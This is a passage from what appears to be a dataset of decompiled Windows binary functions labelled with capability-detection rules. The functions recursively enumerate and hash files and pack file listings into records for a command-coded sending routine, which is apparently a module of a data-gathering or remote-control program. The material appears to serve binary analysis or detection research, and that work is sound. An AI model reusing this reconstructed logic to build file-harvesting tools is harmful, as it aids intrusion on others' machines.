uStack2562, uStack2564, uStack2556, uStack2554)\n                ;\n                puVar1 = puStack1664;\n                uVar8 = uStack1668;\n                if ((uStack1696 & 0x10) == 0) {\n                    puVar4 = \"%d\\a%s\\a%I64u\\a%s\\a\";\n                    puVar7 = auStack2548;\n                    for (iVar5 = 4; iVar5 != 0; iVar5 = iVar5 + -1) {\n                        *puVar7 = *puVar4;\n                        puVar4 = puVar4 + 1;\n                        puVar7 = puVar7 + 1;\n                    }\n                    uStack2608 = uVar8;\n                    uVar9 = 0;\n                    uVar8 = 0;\n                    puStack2604 = puVar1;\n                    sub.KERNEL32.dll_WideCharToMultiByte(0xfde9, 0, auStack1652, 0xffffffff, auStack2472, 0x104, 0, 0);\n                    iVar5 = fcn.004127a8(auStack2244, 0x204, auStack2580, auStack1728[0], auStack2472, uVar9, uVar8, \n                                         auStack2504);\n                    if (0 < iVar5) {\n                        puVar4 = &uStack2620;\n                        goto code_r0x0040672f;\n                    }\n                }\n                else {\n                    pcVar6 = \"%d\\a%s\\a%s\\a\";\n                    puVar4 = auStack2548;\n                    for (iVar5 = 10; iVar5 != 0; iVar5 = iVar5 + -1) {\n                        *puVar4 = *pcVar6;\n                        pcVar6 = pcVar6 + 1;\n                        puVar4 = puVar4 + 1;\n                    }\n                    sub.KERNEL32.dll_WideCharToMultiByte(0xfde9, 0, auStack1652, 0xffffffff, auStack2472, 0x104, 0, 0);\n                    iVar5 = fcn.004127a8(auStack2244, 0x204, auStack2580, auStack1728[0], auStack2472, auStack2504);\n                    if (0 < iVar5) {\n                        puVar4 = &uStack2608;\ncode_r0x0040672f:\n                        fcn.00412458(puVar4, auStack2244, iVar5);\n                    }\n                }\n                iVar5 = sub.KERNEL32.dll_FindNextFileW(iVar3, auStack1728);\n            } while (iVar5 != 0);\n            sub.KERNEL32.dll_FindClose();\n            cVar2 = fcn.004124b9();\n            if (cVar2 != '\\0') {\n                fcn.00412540();\n            }\n            fcn.00405d7d();\n            fcn.004123b1();\n            fcn.004123b1();\n        }\n    }\n    if (*(aiStack32[0] + 0x20c) != '\\0') {\n        fcn.00407f59(aiStack32);\n    }\n    return;\n}\n",
        "token_count": 1365
    },
    "0040680d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n\nvoid fcn.0040680d(void)\n\n{\n    uchar *puVar1;\n    uchar *puVar2;\n    uint32_t uVar3;\n    char cVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint extraout_ECX;\n    uint uVar7;\n    uint unaff_EBX;\n    int32_t *piVar8;\n    int32_t *piVar9;\n    int32_t *piVar10;\n    uint *puVar11;\n    uint unaff_ESI;\n    char *pcVar12;\n    int32_t *piVar13;\n    ulong uVar14;\n    int32_t aiStack52 [7];\n    uint auStack24 [2];\n    \n    auStack24[1] = 0x40681b;\n    iVar5 = fcn.0041f3f0();\n    iVar5 = -iVar5;\n    *(&stack0xfffffff0 + iVar5) = 0x8003;\n    *(&stack0xffffffec + iVar5) = 0x406829;\n    sub.KERNEL32.dll_SetErrorMode();\n    *(&stack0xffffffec + iVar5) = unaff_EBX;\n    puVar1 = &stack0x00000684 + iVar5;\n    *(&stack0x00000000 + iVar5) = 0x204;\n    *(&stack0xfffffff8 + iVar5) = 0x204;\n    *(&stack0xfffffff4 + iVar5) = *(&stack0x00001aac + iVar5);\n    *(&stack0xfffffff0 + iVar5) = 0;\n    *(&stack0xfffffffc + iVar5) = puVar1;\n    *(&stack0xffffffec + iVar5) = 0xfde9;\n    *(&stack0xffffffe8 + iVar5) = 0x406864;\n    sub.KERNEL32.dll_MultiByteToWideChar();\n    *(&stack0xffffffd8 + iVar5) = 0x422f32;\n    *(&stack0xffffffd4 + iVar5) = puVar1;\n    *(&stack0xffffffd0 + iVar5) = 0x406877;\n    sub.msvcrt.dll_wcscat();\n    *(&stack0xffffffd4 + iVar5) = puVar1;\n    *(&stack0xffffffd8 + iVar5) = &stack0x00000108 + iVar5;\n    *(&stack0xffffffd0 + iVar5) = 0x40688a;\n    iVar6 = sub.KERNEL32.dll_FindFirstFileW();\n    *(&stack0xffffffd0 + iVar5) = unaff_ESI;\n    puVar11 = &stack0xffffffcc + iVar5;\n    piVar8 = &stack0xffffffcc + iVar5;\n    *(&stack0xffffffcc + iVar5) = unaff_ESI;\n    *(&stack0xfffffff8 + iVar5) = iVar6;\n    if (iVar6 != -1) {\n        puVar2 = &stack0x0000012c + iVar5;\n        puVar1 = &stack0xfffffffc + iVar5;\n        do {\n            piVar9 = piVar8;\n            if (*0x42b330 == 0) break;\n            piVar8[1] = 0x422f36;\n            *piVar8 = puVar2;\n            piVar8[-1] = 0x4068cd;\n            iVar5 = fcn.00412861();\n            piVar10 = piVar8;\n            if (iVar5 != 0) {\n                piVar8[1] = 0x422f38;\n                *piVar8 = puVar2;\n                piVar8[-1] = 0x4068e5;\n                iVar5 = fcn.00412861();\n                if (iVar5 != 0) {\n                    piVar8[7] = 0;\n                    piVar8[6] = 0;\n                    piVar8[5] = 0x104;\n                    piVar8[4] = puVar1;\n                    piVar8[3] = -1;\n                    piVar8[2] = puVar2;\n                    piVar8[1] = 0;\n                    *piVar8 = 0xfde9;\n                    piVar8[-1] = 0x406929;\n                    sub.KERNEL32.dll_WideCharToMultiByte();\n                    piVar8[-7] = puVar1;\n                    piVar8[-8] = piVar8[0x6a8] + 0x204;\n                    piVar8[-9] = 0x406944;\n                    cVar4 = fcn.004128b5();\n                    if (cVar4 != '\\0') {\n                        uVar3 = piVar8[0x45];\n                        piVar9 = piVar8 + 0xd9;\n                        if ((uVar3 & 0x10) == 0) {\n                            piVar8[-3] = piVar8[0x4d];\n                            piVar8[-2] = piVar8[0x4c];\n                            piVar10 = \"%d\\a%s\\a%I64u\\a%s\\a\";\n                            piVar13 = piVar9;\n                            for (iVar5 = 4; iVar5 != 0; iVar5 = iVar5 + -1) {\n                                *piVar13 = *piVar10;\n                                piVar10 = piVar10 + 1;\n                                piVar13 = piVar13 + 1;\n                            }\n                            piVar8[-4] = puVar1;\n                            piVar8[-5] = uVar3;\n                            piVar8[-6] = piVar9;\n                            piVar8[-7] = 0x1000;\n                            piVar8[-8] = piVar8 + 0x2a0;\n                            piVar8[-1] = piVar8[0x6a8];\n                            piVar8[-9] = 0x4069ef;\n                            iVar5 = fcn.004127a8();\n                        }\n                        else {\n                            pcVar12 = \"%d\\a%s\\a%s\\a\";\n                            piVar10 = piVar9;\n                            for (iVar5 = 10; iVar5 != 0; iVar5 = iVar5 + -1) {\n                                *piVar10 = *pcVar12;\n                                pcVar12 = pcVar12 + 1;\n                                piVar10 = piVar10 + 1;\n                            }\n                            piVar8[-4] = puVar1;\n                            piVar8[-5] = uVar3;\n                            piVar8[-6] = piVar9;\n                            piVar8[-7] = 0x1000;\n                            piVar8[-8] = piVar8 + 0x2a0;\n                            piVar8[-3] = piVar8[0x6a8];\n                            piVar8[-9] = 0x40699b;\n                            iVar5 = fcn.004127a8();\n                        }\n                        piVar10 = piVar8 + -8;\n                        if (iVar5 < 0) goto code_r0x00406aa5;\n                        piVar8[-5] = iVar5;\n                        piVar8[-6] = piVar8 + 0x2a0;\n                        piVar8[-7] = 0xa9;\n                        piVar8[-8] = *(piVar8[0x6a8] + 0x30c);\n                        piVar8[-9] = 0x406a1c;\n                        fcn.00405d7d();\n                    }\n                    piVar10 = piVar8 + -8;\n                    if ((*(piVar8 + 0x45) & 0x10) != 0) {\n                        piVar8[-6] = 0x104;\n                        piVar8[-7] = piVar8[0x6a8] + 0x204;\n                        piVar8[-8] = piVar8 + 0x15a;\n                        piVar8[-9] = 0x406a54;\n                        fcn.00412548();\n                        piVar8[-4] = puVar1;\n                        piVar8[-6] = 0x422f3b;\n                        piVar8[-7] = 0x204;\n                        piVar8[-8] = piVar8 + 0xd9;\n                        piVar8[-5] = piVar8[0x6a8];\n                        piVar8[-9] = 0x406a7b;\n                        fcn.004127a8();\n                        piVar8[0x19b] = *(piVar8[0x6a8] + 0x308) + 1;\n                        iVar5 = *(piVar8[0x6a8] + 0x30c);\n                        piVar8[-8] = piVar8 + 0xd9;\n                        piVar8[0x19c] = iVar5;\n                        piVar8[-9] = 0x406aa5;\n                        fcn.0040680d();\n                        piVar10 = piVar8 + -8;\n                    }\n                }\n            }\ncode_r0x00406aa5:\n            piVar10[1] = piVar10 + 0x4d;\n            *piVar10 = piVar10[0xb];\n            piVar10[-1] = 0x406abc;\n            uVar14 = sub.KERNEL32.dll_FindNextFileW();\n            uVar7 = uVar14 >> 0x20;\n            piVar10[-1] = uVar7;\n            piVar8 = piVar10 + -2;\n            piVar9 = piVar10 + -2;\n            piVar10[-2] = uVar7;\n        } while (uVar14 != 0);\n        *piVar9 = piVar9[0xb];\n        piVar9[-1] = 0x4068b7;\n        sub.KERNEL32.dll_FindClose();\n        puVar11 = piVar9 + -1;\n        piVar9[-1] = extraout_ECX;\n    }\n    if (*(puVar11[0x6b0] + 0x308) == 0) {\n        puVar11[3] = 0;\n        puVar11[2] = 0;\n        puVar11[1] = 0xaa;\n        *puVar11 = *(puVar11[0x6b0] + 0x30c);\n        puVar11[-1] = 0x406b01;\n        fcn.00405d7d();\n        if (*(puVar11[0x6b0] + 0x310) != '\\0') {\n            *puVar11 = puVar11 + 0x6b0;\n            puVar11[-1] = 0x406b20;\n            fcn.00407f59();\n        }\n    }\n    return;\n}\n",
        "token_count": 2385
    },
    "00406b2b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.00406b2b(uint param_1, int32_t param_2, int32_t param_3)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint8_t uVar3;\n    uint8_t uVar4;\n    uint8_t auStack2244 [16];\n    uchar auStack2228 [152];\n    uchar auStack2076 [2060];\n    \n    fcn.00412548(param_2, 0x422f41, param_3);\n    iVar1 = sub.msvcrt.dll__wfopen(param_1, 0x422f44);\n    if (iVar1 != 0) {\n        fcn.0040adea(auStack2228);\n        while( true ) {\n            iVar2 = sub.msvcrt.dll_fread(auStack2076, 1, 0x800, iVar1);\n            if ((iVar2 == 0) || (*0x42b32c == 0)) break;\n            fcn.0040ae18(auStack2228, auStack2076, iVar2);\n        }\n        fcn.0040aec6(auStack2244, auStack2228);\n        iVar2 = 0;\n        do {\n            uVar3 = auStack2244[iVar2];\n            uVar4 = uVar3 & 0xf;\n            uVar3 = uVar3 >> 4;\n            *(param_2 + iVar2 * 2) = (-(uVar3 < 10) & 0xf9U) + 0x37 + uVar3;\n            *(param_2 + 1 + iVar2 * 2) = (-(uVar4 < 10) & 0xf9U) + 0x37 + uVar4;\n            iVar2 = iVar2 + 1;\n        } while (iVar2 != 0x10);\n        *(param_2 + -1 + param_3) = 0;\n        sub.msvcrt.dll_fclose(iVar1);\n    }\n    return;\n}\n",
        "token_count": 445
    },
    "00406f83": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.00406f83(int32_t param_1)\n\n{\n    char *pcVar1;\n    char cVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    char *pcVar8;\n    uint8_t auStack2952 [8];\n    uchar auStack2944 [36];\n    uchar auStack2908 [275];\n    char acStack2633 [13];\n    uchar auStack2620 [504];\n    uchar auStack2116 [527];\n    char acStack1589 [505];\n    uchar auStack1084 [12];\n    uchar auStack1072 [504];\n    uchar auStack568 [516];\n    uint uStack52;\n    int32_t iStack48;\n    uint uStack44;\n    \n    if (*(param_1 + 0x40c) == 0) {\n        pcVar1 = acStack1589 + 1;\n        iVar3 = fcn.00412548(pcVar1, param_1, 0x204);\n        if ((acStack1589[iVar3] == '\\\\') || (acStack1589[iVar3] == '/')) {\n            acStack1589[iVar3] = '\\0';\n        }\n        cVar2 = fcn.00406f1a(pcVar1);\n        if (cVar2 != '\\0') {\n            fcn.00412c67(pcVar1, auStack1072, 0x104);\n            fcn.00412c0f(pcVar1, auStack2620, 0x204);\n            fcn.0041e557(*(param_1 + 0x408), auStack1072);\n            fcn.0041ed42(*(param_1 + 0x408), pcVar1);\n            fcn.0041e988(*(param_1 + 0x408));\n            goto code_r0x00407283;\n        }\n    }\n    sub.KERNEL32.dll_SetErrorMode(0x8003);\n    iVar3 = fcn.004127a8(auStack2620, 0x204, 0x422f4a, param_1);\n    if (iVar3 == -1) {\n        return;\n    }\n    iVar3 = sub.KERNEL32.dll_FindFirstFileA(auStack2620, auStack2944);\n    if (iVar3 != -1) {\n        pcVar1 = acStack2633 + 1;\n        do {\n            iVar4 = sub.msvcrt.dll_strcmp(auStack2908, 0x422f36);\n            if ((iVar4 != 0) && (iVar4 = sub.msvcrt.dll_strcmp(auStack2908, 0x422f38),  iVar4 != 0)) {\n                fcn.004127a8(pcVar1, 0x204, 0x422f51, param_1, auStack2908);\n                if ((auStack2952[0] & 0x10) == 0) {\n                    iVar4 = sub.msvcrt.dll_fopen(pcVar1, 0x422f58);\n                    if (iVar4 != 0) {\n                        uVar6 = 0xffffffff;\n                        pcVar8 = pcVar1;\n                        do {\n                            if (uVar6 == 0) break;\n                            uVar6 = uVar6 - 1;\n                            cVar2 = *pcVar8;\n                            pcVar8 = pcVar8 + 1;\n                        } while (cVar2 != '\\0');\n                        uVar7 = 0xffffffff;\n                        pcVar8 = param_1 + 0x204;\n                        do {\n                            if (uVar7 == 0) break;\n                            uVar7 = uVar7 - 1;\n                            cVar2 = *pcVar8;\n                            pcVar8 = pcVar8 + 1;\n                        } while (cVar2 != '\\0');\n                        sub.msvcrt.dll_strncpy(auStack2116, acStack2633 + ~uVar7, ~uVar6 - 1);\n                        fcn.0041e557(*(param_1 + 0x408), auStack2116);\n                        fcn.0041ed42(*(param_1 + 0x408), pcVar1);\n                        fcn.0041e988(*(param_1 + 0x408));\n                        sub.msvcrt.dll_fclose(iVar4);\n                    }\n                }\n                else {\n                    uVar5 = sub.msvcrt.dll_strcat(auStack2116, 0x422f56);\n                    fcn.0041e557(*(param_1 + 0x408), uVar5);\n                    fcn.0041ed42(*(param_1 + 0x408), pcVar1);\n                    fcn.0041e988(*(param_1 + 0x408));\n                }\n                if ((auStack2952[0] & 0x10) != 0) {\n                    fcn.004127a8(auStack1084, 0x204, 0x422f3b, param_1, auStack2908);\n                    iStack48 = *(param_1 + 0x40c) + 1;\n                    uStack44 = *(param_1 + 0x410);\n                    uStack52 = *(param_1 + 0x408);\n                    sub.msvcrt.dll_strcpy(auStack568, param_1 + 0x204);\n                    fcn.00406f83(auStack1084);\n                }\n            }\n            iVar4 = sub.KERNEL32.dll_FindNextFileA(iVar3, auStack2952);\n        } while (iVar4 != 0);\n        sub.KERNEL32.dll_FindClose();\n    }\n    if (*(param_1 + 0x40c) != 0) {\n        return;\n    }\ncode_r0x00407283:\n    fcn.0041e521(*(param_1 + 0x408));\n    return;\n}\n",
        "token_count": 1300
    },
    "null": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "0040753d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n\nvoid fcn.0040753d(void)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint extraout_ECX;\n    uint uVar5;\n    uchar *unaff_EBX;\n    uchar *puVar6;\n    int32_t *piVar7;\n    int32_t *piVar8;\n    int32_t *piVar9;\n    uint *puVar10;\n    char *pcVar11;\n    char *pcVar12;\n    ulong uVar13;\n    uint uStack44;\n    int32_t aiStack40 [6];\n    \n    puVar6 = &stack0xfffffff0;\n    aiStack40[5] = 0x40754b;\n    iVar3 = fcn.0041f3f0();\n    iVar3 = -iVar3;\n    puVar1 = &stack0x000007c8 + iVar3;\n    if (*(*(&stack0x00001bf0 + iVar3) + 0x204) == 0) {\n        unaff_EBX = &stack0x00000164 + iVar3;\n        *(&stack0xfffffff8 + iVar3) = 0x204;\n        *(&stack0xfffffff4 + iVar3) = *(&stack0x00001bf0 + iVar3);\n        *(&stack0xfffffff0 + iVar3) = unaff_EBX;\n        *(&stack0xffffffec + iVar3) = 0x407583;\n        iVar4 = fcn.00412548();\n        if (((&stack0x00000163)[iVar4 + -1 + iVar3 + 1] == '\\\\') || ((&stack0x00000163)[iVar4 + -1 + iVar3 + 1] == '/'))\n        {\n            (&stack0x00000163)[iVar4 + -1 + iVar3 + 1] = 0;\n        }\n        *(&stack0x00000004 + iVar3) = 0x204;\n        *(&stack0x00000000 + iVar3) = puVar1;\n        *(&stack0xfffffffc + iVar3) = 0x204;\n        *(&stack0xfffffff8 + iVar3) = unaff_EBX;\n        *(&stack0xfffffff4 + iVar3) = 0;\n        *(&stack0xfffffff0 + iVar3) = 0xfde9;\n        *(&stack0xffffffec + iVar3) = 0x4075c9;\n        sub.KERNEL32.dll_MultiByteToWideChar();\n        puVar6 = &stack0xffffffd8;\n        puVar10 = puVar6 + iVar3;\n        *(puVar6 + iVar3) = unaff_EBX;\n        *(&stack0xffffffd4 + iVar3) = 0x4075d4;\n        cVar2 = fcn.00406f1a();\n        if (cVar2 != '\\0') {\n            *(puVar6 + iVar3) = unaff_EBX;\n            *(&stack0xffffffe0 + iVar3) = 0x104;\n            *(&stack0xffffffdc + iVar3) = &stack0x00000350 + iVar3;\n            *(&stack0xffffffd4 + iVar3) = 0x4075ff;\n            fcn.00412c67();\n            *(puVar6 + iVar3) = unaff_EBX;\n            *(&stack0xffffffe0 + iVar3) = 0x204;\n            *(&stack0xffffffdc + iVar3) = &stack0x00000560 + iVar3;\n            *(&stack0xffffffd4 + iVar3) = 0x40761a;\n            fcn.00412c0f();\n            *(puVar6 + iVar3) = puVar1;\n            *(&stack0xffffffe0 + iVar3) = 0x21;\n            *(&stack0xffffffdc + iVar3) = &stack0x00000027 + iVar3;\n            *(&stack0xffffffd4 + iVar3) = 0x407633;\n            fcn.00406b2b();\n            pcVar11 = \"%d\\a%s\\a%I64u\\a%s\\a%s\\a\";\n            pcVar12 = &stack0x00000048 + iVar3;\n            for (iVar4 = 0x13; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *pcVar12 = *pcVar11;\n                pcVar11 = pcVar11 + 1;\n                pcVar12 = pcVar12 + 1;\n            }\n            *(puVar6 + iVar3) = unaff_EBX;\n            *(&stack0xffffffd4 + iVar3) = 0x407649;\n            uVar13 = fcn.004074c5();\n            *(&stack0xffffffec + iVar3) = uVar13;\n            *(&stack0xfffffff8 + iVar3) = &stack0x00000027 + iVar3;\n            *(&stack0xfffffff0 + iVar3) = uVar13 >> 0x20;\n            *(&stack0xffffffe8 + iVar3) = &stack0x00000350 + iVar3;\n            *(&stack0xfffffff4 + iVar3) = &stack0x00000560 + iVar3;\n            *(&stack0xffffffe4 + iVar3) = 0;\n            *(&stack0xffffffdc + iVar3) = 0x1000;\n            *(&stack0xffffffe0 + iVar3) = &stack0x00000048 + iVar3;\n            *(puVar6 + iVar3) = &stack0x00000bb8 + iVar3;\n            *(&stack0xffffffd4 + iVar3) = 0x40768b;\n            iVar4 = fcn.004127a8();\n            if (0 < iVar4) {\n                *(&stack0xffffffe4 + iVar3) = iVar4;\n                *(&stack0xffffffe0 + iVar3) = &stack0x00000bb8 + iVar3;\n                *(&stack0xffffffdc + iVar3) = 0xe1;\n                *(puVar6 + iVar3) = *(*(&stack0x00001bd8 + iVar3) + 0x208);\n                *(&stack0xffffffd4 + iVar3) = 0x4076b4;\n                fcn.00405d7d();\n            }\n            *(puVar6 + iVar3) = 0x32;\n            *(&stack0xffffffd4 + iVar3) = 0x4076c0;\n            fcn.00407ef4();\n            *(&stack0xffffffe4 + iVar3) = 0;\n            *(&stack0xffffffe0 + iVar3) = 0;\n            *(&stack0xffffffdc + iVar3) = 0xe2;\n            iVar3 = *(&stack0x00001bd8 + iVar3);\n            goto code_r0x00407a7e;\n        }\n    }\n    *(puVar6 + iVar3) = 0x8003;\n    *(puVar6 + iVar3 + -4) = 0x4076f0;\n    sub.KERNEL32.dll_SetErrorMode();\n    *(puVar6 + iVar3 + -4) = unaff_EBX;\n    *(puVar6 + iVar3 + 0xc) = puVar1;\n    *(puVar6 + iVar3 + 0x10) = 0x204;\n    *(puVar6 + iVar3 + 8) = 0x204;\n    *(puVar6 + iVar3 + 4) = *(puVar6 + iVar3 + 0x1bfc);\n    *(puVar6 + iVar3) = 0;\n    *(puVar6 + iVar3 + -4) = 0xfde9;\n    *(puVar6 + iVar3 + -8) = 0x407724;\n    sub.KERNEL32.dll_MultiByteToWideChar();\n    *(puVar6 + iVar3 + -0x1c) = puVar1;\n    *(puVar6 + iVar3 + -0x18) = 0x422f32;\n    *(puVar6 + iVar3 + -0x20) = 0x407737;\n    sub.msvcrt.dll_wcscat();\n    *(puVar6 + iVar3 + -0x1c) = puVar1;\n    *(puVar6 + iVar3 + -0x18) = puVar6 + iVar3 + 0x56c;\n    *(puVar6 + iVar3 + -0x20) = 0x40774a;\n    iVar4 = sub.KERNEL32.dll_FindFirstFileW();\n    *(puVar6 + iVar3 + -0x20) = puVar1;\n    puVar10 = puVar6 + iVar3 + -0x24;\n    piVar7 = puVar6 + iVar3 + -0x24;\n    *(puVar6 + iVar3 + -0x24) = puVar1;\n    *(puVar6 + iVar3 + 0xc) = iVar4;\n    if (iVar4 != -1) {\n        puVar1 = puVar6 + iVar3 + 0x590;\n        puVar6 = puVar6 + iVar3 + 0x7b4;\n        do {\n            piVar8 = piVar7;\n            if (*0x42b32c == 0) break;\n            piVar7[1] = 0x422f36;\n            *piVar7 = puVar1;\n            piVar7[-1] = 0x407790;\n            iVar3 = fcn.00412861();\n            piVar9 = piVar7;\n            if (iVar3 != 0) {\n                piVar7[1] = 0x422f38;\n                *piVar7 = puVar1;\n                piVar7[-1] = 0x4077a8;\n                iVar3 = fcn.00412861();\n                if (iVar3 != 0) {\n                    if ((*(piVar7 + 0x162) & 0x10) == 0) {\n                        piVar7[5] = 0x204;\n                        piVar7[4] = puVar6;\n                        piVar7[3] = 0x204;\n                        piVar7[1] = 0;\n                        *piVar7 = 0xfde9;\n                        piVar7[0xd] = piVar7[0x16a];\n                        piVar7[0xe] = piVar7[0x169];\n                        piVar7[2] = piVar7[0x700];\n                        piVar7[-1] = 0x407937;\n                        sub.KERNEL32.dll_MultiByteToWideChar();\n                        piVar7[-5] = puVar1;\n                        piVar7[-6] = puVar6;\n                        piVar7[-7] = 0x40794d;\n                        sub.msvcrt.dll_wcscat();\n                        piVar7[-4] = 0x21;\n                        piVar7[-6] = puVar6;\n                        piVar7[-5] = piVar7 + 0x37;\n                        piVar7[9] = piVar7 + 0x37;\n                        piVar7[-7] = 0x407969;\n                        fcn.00406b2b();\n                        pcVar11 = \"%d\\a%s\\a%I64u\\a%s\\a%s\\a\";\n                        piVar8 = piVar7 + 0xd8;\n                        for (iVar3 = 0x13; iVar3 != 0; iVar3 = iVar3 + -1) {\n                            *piVar8 = *pcVar11;\n                            pcVar11 = pcVar11 + 1;\n                            piVar8 = piVar8 + 1;\n                        }\n                        piVar7[1] = 0;\n                        *piVar7 = 0;\n                        piVar7[-1] = 0x104;\n                        piVar7[-3] = -1;\n                        piVar7[-2] = piVar7 + 0x16;\n                        piVar7[-4] = puVar1;\n                        piVar7[-5] = 0;\n                        piVar7[-6] = 0xfde9;\n                        piVar7[-7] = 0x4079b0;\n                        sub.KERNEL32.dll_WideCharToMultiByte();\n                        piVar7[-10] = piVar7 + 0x16;\n                        piVar7[-0xd] = 0x1000;\n                        piVar7[-7] = piVar7[0x6f2];\n                        piVar7[-6] = piVar7[1];\n                        piVar7[-0xe] = piVar7 + 0x2ea;\n                        piVar7[-9] = piVar7[-1];\n                        piVar7[-8] = *piVar7;\n                        piVar7[-0xb] = piVar7[0x154];\n                        piVar7[-0xc] = piVar7 + 0xd0;\n                        piVar7[-0xf] = 0x407a07;\n                        iVar3 = fcn.004127a8();\n                        piVar9 = piVar7 + -0xe;\n                        if (-1 < iVar3) {\n                            piVar7[-0xb] = iVar3;\n                            piVar7[-0xc] = piVar7 + 0x2ea;\n                            piVar7[-0xd] = 0xe1;\n                            piVar7[-0xe] = *(piVar7[0x6f2] + 0x208);\n                            piVar7[-0xf] = 0x407a30;\n                            fcn.00405d7d();\n                            piVar9 = piVar7 + -0xe;\n                        }\n                    }\n                    else {\n                        pcVar11 = \"%d\\a%s\\a%s\\a\";\n                        pcVar12 = piVar7 + 0x45;\n                        for (iVar3 = 10; iVar3 != 0; iVar3 = iVar3 + -1) {\n                            *pcVar12 = *pcVar11;\n                            pcVar11 = pcVar11 + 1;\n                            pcVar12 = pcVar12 + 1;\n                        }\n                        piVar8 = piVar7 + 0x1c;\n                        piVar7[7] = 0;\n                        piVar7[6] = 0;\n                        piVar7[5] = 0x104;\n                        piVar7[3] = -1;\n                        piVar7[4] = piVar8;\n                        piVar7[2] = puVar1;\n                        piVar7[1] = 0;\n                        *piVar7 = 0xfde9;\n                        piVar7[-1] = 0x40780e;\n                        sub.KERNEL32.dll_WideCharToMultiByte();\n                        piVar7[-4] = piVar8;\n                        piVar7[-7] = 0x1000;\n                        piVar7[-8] = piVar7 + 0x2f0;\n                        piVar7[-3] = piVar7[0x6f8];\n                        piVar7[-5] = piVar7[0x15a];\n                        piVar7[-6] = piVar7 + 0x25;\n                        piVar7[-9] = 0x40784a;\n                        iVar3 = fcn.004127a8();\n                        piVar9 = piVar7 + -8;\n                        if (-1 < iVar3) {\n                            piVar7[-5] = iVar3;\n                            piVar7[-6] = piVar7 + 0x2f0;\n                            piVar7[-7] = 0xe1;\n                            piVar7[-8] = *(piVar7[0x6f8] + 0x208);\n                            piVar7[-9] = 0x407877;\n                            fcn.00405d7d();\n                            piVar9 = piVar7 + -8;\n                            if (*(piVar7[0x6f8] + 0x20c) != '\\0') {\n                                piVar7[-4] = piVar8;\n                                piVar7[-5] = piVar7[0x6f8];\n                                piVar7[-6] = 0x422f3b;\n                                piVar7[-7] = 0x204;\n                                piVar7[-8] = piVar7 + 0xd6;\n                                piVar7[-9] = 0x4078b2;\n                                fcn.004127a8();\n                                piVar7[0x157] = *(piVar7[0x6f8] + 0x204) + 1;\n                                iVar3 = *(piVar7[0x6f8] + 0x208);\n                                piVar7[-8] = piVar7 + 0xd6;\n                                *(piVar7 + 0x159) = 1;\n                                piVar7[0x158] = iVar3;\n                                piVar7[-9] = 0x4078e4;\n                                fcn.0040753d();\n                                piVar9 = piVar7 + -8;\n                            }\n                        }\n                    }\n                }\n            }\n            piVar9[1] = piVar9 + 0x162;\n            *piVar9 = piVar9[0xc];\n            piVar9[-1] = 0x407a47;\n            uVar13 = sub.KERNEL32.dll_FindNextFileW();\n            uVar5 = uVar13 >> 0x20;\n            piVar9[-1] = uVar5;\n            piVar7 = piVar9 + -2;\n            piVar8 = piVar9 + -2;\n            piVar9[-2] = uVar5;\n        } while (uVar13 != 0);\n        *piVar8 = piVar8[0xc];\n        piVar8[-1] = 0x40777a;\n        sub.KERNEL32.dll_FindClose();\n        puVar10 = piVar8 + -1;\n        piVar8[-1] = extraout_ECX;\n    }\n    iVar3 = *(puVar10 + 0x1c00);\n    if (*(iVar3 + 0x204) != 0) {\n        return;\n    }\n    *(puVar10 + 0xc) = 0;\n    *(puVar10 + 8) = 0;\n    *(puVar10 + 4) = 0xe2;\ncode_r0x00407a7e:\n    *puVar10 = *(iVar3 + 0x208);\n    puVar10[-1] = 0x407a8c;\n    fcn.00405d7d();\n    if (*(puVar10[0x700] + 0x20d) != '\\0') {\n        *puVar10 = puVar10 + 0x700;\n        puVar10[-1] = 0x407aab;\n        fcn.00407f59();\n    }\n    return;\n}\n",
        "token_count": 4169
    },
    "00407fc3": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
